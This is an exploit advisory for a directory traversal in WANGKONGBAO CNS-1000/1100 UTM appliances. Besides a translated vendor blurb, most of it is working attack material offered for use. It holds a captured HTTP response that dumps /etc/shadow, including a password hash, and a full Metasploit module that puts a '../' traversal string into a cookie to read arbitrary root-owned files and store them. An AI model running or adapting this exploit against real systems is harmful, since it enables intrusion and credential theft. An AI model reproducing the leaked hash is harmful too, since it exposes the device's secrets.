# Exploit Title: WANGKONGBAO CNS-1000 and 1100 Network Security Platform UTM Directory Traversal
# Date: 7/2/2012
# Exploit Author: Dillon Beresford
# Vendor Homepage: http://www.wangkongbao.com/products.html
# Version: CNS-1000 and 1100

The issue is in the /src/acloglogin.php langid and lang parameters stored inside the cookie. Using a URL encoded POST or GET via port 85 input langid or lang will allow an attacker to view any file on the file system or upload arbitrary files to the file system. The webserver is running as root... nuff said.

Enjoy! - D1N

Translated to English

Network control Po for SME hardware products based on dedicated chips and professional network security platform, a new generation of integrated network security and Internet management.

Professional network security platform, the network control Po] detected in the case does not affect network performance harmful # viruses, worms and other network security threats, and provides a cost-effective, high availability and powerful solution to detect, to # block attacks, prevent the normal use and improve the service reliability of network applications.

On the internal security of the Internet behavior management (network security audit) to ensure that enterprises and rational use of # Internet resources, to prevent the assets of the enterprise information leakage, the network control Po] provides a complete access # control capabilities. Reasonable set access permissions, to prevent access to bad sites and dangerous resources, to prevent the security # risks of P2P software on the enterprise network. Bandwidth management and access tracking technology, can effectively prevent the abuse # of Internet resources. [Network Control Po] sensitive content interception and security audit function is more to prevent confidential # information leaks to provide the most effective guarantee.

In addition, as a UTM integrated device, network control Po] also provides a wealth of external security measures. In addition to the # firewall module and VPN modules, network control Po] integrated from Europe's leading virus vendor F-PROT antivirus engine to the # internal network users to receive e-mail and downloaded files for viruses filter, reducing the Intranet users the risk of infection. In # addition, a powerful spam filtering shut out a lot of spam, but also greatly improve the efficiency of the office employees use the # Internet. At the same time [Network Control] also provides efficient IPS (Intrusion Prevention System) feature, and can effectively # identify and resist the attack of more than 3000 kinds, the greater the scope of protection of enterprises connected to the Internet # # security.

HTTP/1.1 200 OKDate: Mon, 02 Jul 2012 12:15:20 GMTServer: Apache/1.3.37 (Unix) PHP/5.2.1X-Powered-By: PHP/5.2.1Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheKeep-Alive: timeout=15, max=50Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: text/htmld2droot:!!:12919:0:99999:7:::
bin:*:12807:0:99999:7:::
daemon:*:12807:0:99999:7:::
adm:*:12807:0:99999:7:::
lp:*:12807:0:99999:7:::
sync:*:12807:0:99999:7:::
shutdown:*:12807:0:99999:7:::
halt:*:12807:0:99999:7:::
mail:*:12807:0:99999:7:::
news:*:12807:0:99999:7:::
uucp:*:12807:0:99999:7:::
operator:*:12807:0:99999:7:::
games:*:12807:0:99999:7:::
gopher:*:12807:0:99999:7:::
ftp:*:12807:0:99999:7:::
nobody:*:12807:0:99999:7:::
rpm:!!:12807:0:99999:7:::
vcsa:!!:12807:0:99999:7:::
nscd:!!:12807:0:99999:7:::
sshd:!!:12807:0:99999:7:::
rpc:!!:12807:0:99999:7:::
rpcuser:!!:12807:0:99999:7:::
nfsnobody:!!:12807:0:99999:7:::
mailnull:!!:12807:0:99999:7:::
smmsp:!!:12807:0:99999:7:::
pcap:!!:12807:0:99999:7:::
xfs:!!:12807:0:99999:7:::
ntp:!!:12807:0:99999:7:::
gdm:!!:12807:0:99999:7:::
desktop:!!:12807:0:99999:7:::
mysql:!!:12807:0:99999:7:::
kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7:::


##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner


	def initialize
		super(
			'Name'           => 'WANGKONGBAO CNS-1000 and 1100 UTM Directory Traversal 0day',
			'Version'        => '$Revision$',
			'Description'    => %q{
					This module exploits the WANGKONGBAO CNS-1000 and 1100 UTM appliances aka Network Security Platform.
					This directory traversal vulnerability is interesting because the apache server is running as root,
					this means we can grab anything we want! For instance, the /etc/shadow and /etc/passwd files for the special
					kfc:$1$SlSyHd1a$PFZomnVnzaaj3Ei2v1ByC0:15488:0:99999:7::: user
			},
			'References'     =>
				[

				],
			'Author'         =>
				[
					'Dillon Beresford'
				],
			'License'        =>  MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(85),
				OptString.new('FILEPATH', [false, 'The name of the file to download', '/etc/shadow']),
				OptString.new('DIRTRAVS',      [true, 'Traversal depth', '../../../../../../../../../..']),
			], self.class)
	end

	def run_host(ip)
		# No point to continue if no filename is specified
		if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
			print_error("Please supply the name of the file you want to download")
			return
		end

		# Create request
		path = "/src/acloglogin.php"
		res = send_request_raw({
			'method' => 'GET',
			'uri'    => "#{path}",
		        'headers' =>
			    {
                        'Connection' => "keep-alive",
                        'Accept-Encoding' => "zip,deflate",
		        'Cookie' => "PHPSESSID=af0402062689e5218a8bdad17d03f559; lang=owned" + datastore['DIRTRAVS'] + datastore['FILEPATH'] + "/."*4043
			    },
		}, 25)
		print_status "File retreived successfully!"
		# Show data if needed
		if res and res.code == 200
			vprint_line(res.to_s)
			fname = File.basename(datastore['FILEPATH'])

			path = store_loot(
				'cns1000utm.http',
				'application/octet-stream',
				ip,
				res.body,
				fname
			)
			print_status("File saved in: #{path}")
		else
			print_error("Nothing was downloaded")
		end
	end
end